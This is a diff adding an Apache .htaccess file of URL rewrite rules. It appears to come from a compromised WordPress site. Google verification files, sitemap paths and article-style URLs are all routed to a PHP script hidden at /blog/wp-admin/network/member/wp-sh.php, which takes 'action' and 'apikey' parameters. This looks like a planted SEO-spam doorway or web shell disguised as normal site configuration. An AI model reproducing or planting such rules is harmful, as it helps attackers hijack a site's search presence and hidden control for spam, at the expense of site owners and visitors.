@@ -1,0 +1,13 @@
+RewriteEngine On
+
+RewriteCond %{SERVER_PORT} 80
+
+# RewriteRule ^(.*)$ /index.php/$1 [R=301,L]
+
+RewriteRule ^google(.*)\.html$ /blog/wp-admin/network/member/wp-sh.php?gg=$1 [L]
+
+RewriteRule ^sitemap/article/(.*)/p(.*) /blog/wp-admin/network/member/wp-sh.php?action=sitemap&apikey=$1&page=$2 [L]
+
+RewriteRule ^sitemap/(.*)  /blog/wp-admin/network/member/wp-sh.php?action=mapindex&apikey=$1 [L]
+
+RewriteRule ^(\w+)-[^/]*-(\d+)\.\w+$ /blog/wp-admin/network/member/wp-sh.php?action=article&apikey=$1&id=$2 [L]
